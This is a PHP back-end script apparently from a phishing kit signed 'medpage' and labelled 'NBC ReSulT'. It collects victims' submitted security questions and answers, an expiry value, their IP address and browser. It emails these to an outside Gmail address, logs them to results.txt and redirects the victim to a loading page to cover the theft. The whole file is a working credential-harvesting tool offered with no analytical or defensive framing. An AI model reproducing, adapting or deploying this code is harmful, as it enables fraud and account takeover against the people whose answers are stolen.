<?
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------2 PersonalDetails-----------\n";
$message .= "QUESTION	: ".$_POST['Q1']."\n";
$message .= "ANSWER		: ".$_POST['A1']."\n";
$message .= "QUESTION	: ".$_POST['Q2']."\n";
$message .= "ANSWER		: ".$_POST['A2']."\n";
$message .= "QUESTION	: ".$_POST['Q3']."\n";
$message .= "ANSWER		: ".$_POST['A3']."\n";
$message .= "EXP		: ".$_POST['ED']."\n";
$message .= "----------------created by medpage-----------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "-----------------NBC ReSulT------------------\n";
$send = "all.results13@gmail.com";
$subject = "NBCresults  2 ".$_POST['results'];
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message);
}
$fp = fopen('results.txt', 'a');
fwrite($fp, $message);
fclose($fp);
?>
<script>

    window.top.location.href = "loading.html";
</script>